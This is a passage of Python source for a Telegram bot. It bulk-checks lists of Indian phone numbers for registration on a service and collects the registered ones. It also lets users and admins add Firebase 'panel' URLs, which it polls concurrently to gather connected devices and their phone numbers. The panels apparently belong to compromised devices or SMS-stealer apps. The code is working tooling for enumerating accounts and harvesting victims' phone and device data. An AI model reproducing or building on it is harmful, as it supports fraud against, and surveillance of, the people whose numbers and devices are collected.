            kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
            await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else:
            total_bulk = len(target_nums)
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
            
            bulk_results = []
            registered_list = []
            BATCH_SIZE = 100 
            
            for i in range(0, total_bulk, BATCH_SIZE):
                batch = target_nums[i:i+BATCH_SIZE]
                tasks = [check_number_api(service, num) for num in batch]
                res_list = await asyncio.gather(*tasks, return_exceptions=True)
                
                for num, res in zip(batch, res_list):
                    if isinstance(res, Exception) or res.get("status") == "error":
                        bulk_results.append(f"❌ <code>{num}</code> - Error")
                        continue
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    stat = "Reg" if is_reg else "UNREG"
                    bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {stat}")
                    if is_reg:
                        registered_list.append(num)
                    
                await asyncio.sleep(0.5)
            
            res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
            if len(res_text) > 4000:
                res_text = res_text[:4000] + "\n...[Truncated]"
                
            kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
            await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            
            if registered_list and chat_id in ADMIN_IDS:
                file_name = f"Registered_{service.upper()}_Bulk.txt"
                file_path = os.path.join(SYS_DIR, file_name)
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(list(set([f"+91{num[-10:]}" for num in registered_list]))))
                try: await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename=file_name, caption=f"📁 Bulk Check Registered Numbers ({service.upper()})")
                except: pass
                
        return

    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
        pending_action.pop(chat_id)
        urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
        firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
        if not firebase_urls:
            await update.message.reply_text("Koi valid Firebase URL nahi mili.")
            return
            
        global_list = SETTINGS.get("global_panels", [])
        global_list.extend(firebase_urls)
        SETTINGS["global_panels"] = global_list
        save_settings()
        await update.message.reply_text(f"✅ SUCCESS! {len(firebase_urls)} panels Global Default list me add ho gaye hain.")
        return

    if action == "set_personal_db":
        urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
        firebase_urls = [u for u in urls if 'firebaseio.com' in u or 'firebasedatabase.app' in u]
        
        if not firebase_urls:
            await update.message.reply_text("❌ Invalid Input! Kripya sirf Firebase URLs bhejein.")
            return
            
        pending_action.pop(chat_id)
        expiry_time = time.time() + (86400 * 365) 
        
        for custom_url in firebase_urls:
            new_entry = {"url": custom_url, "expiry": expiry_time}
            users_db.setdefault(chat_id, {}).setdefault("custom_dbs", []).append(new_entry)
            
        save_user(chat_id)
        
        for adm in ADMIN_IDS:
            if adm != chat_id:
                try:
                    await ctx.bot.send_message(adm, f"🚨 **PANEL ADD ALERT**\nUser ID: `{chat_id}`\nUsername: @{update.effective_user.username}\nAdded {len(firebase_urls)} Custom Panels.", parse_mode="Markdown")
                except: pass
        
        await update.message.reply_text(f"✅ {len(firebase_urls)} Personal Firebase URLs successfully add ho gaye!\n\nAb aap 'Devices List' me jakar sirf apne numbers dekh sakte hain.", reply_markup=get_reply_menu(chat_id))
        return

# ═══════════════════════════════════════════════════════
#  FIREBASE POLL — FAST CONCURRENT ENGINE
# ═══════════════════════════════════════════════════════

async def _update_global_cache():
    dbs_to_poll = dict(DATABASES)
    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
        dbs_to_poll[f"G_{i}"] = g_url
            
    for uid, uinfo in all_users.items():
        for i, db_url in enumerate(get_user_dbs(uinfo)):
            dbs_to_poll[f"U_{uid}_{i}"] = db_url

    all_devices_gathered = []
    for tag, url in dbs_to_poll.items():
        try:
            devs = await fetch_db_data(tag, url)
            all_devices_gathered.extend(devs)
        except: pass
        
    unique_devices = []
    seen_ids_cache = set()
    seen_numbers = set()

    for d in all_devices_gathered:
        if d.id in seen_ids_cache:
            continue
        seen_ids_cache.add(d.id)
        if d.numbers:
            new_nums = [num for num in d.numbers if num not in seen_numbers]
            if not new_nums:
                continue 
            d.numbers = new_nums
            seen_numbers.update(new_nums)
        
        unique_devices.append(d)

    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    GLOBAL_DEVICE_CACHE["ALL"] = unique_devices

async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            await _update_global_cache()
            if first_run:
                first_run = False
                tlog("Private Bot Engine ready! Monitoring DBs...")
        except Exception as e:
            tlog(f"Polling Exception: {e}")
            await asyncio.sleep(5)
            
        await asyncio.sleep(POLL_INTERVAL)

# ═══════════════════════════════════════════════════════
#  MAIN ENTRY POINT (WINDOWS CRASH FIX ENABLED)
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("TOKEN is missing!")

    if sys.platform == 'win32':
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass

    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(4096)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(hourly_admin_backup(application))

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
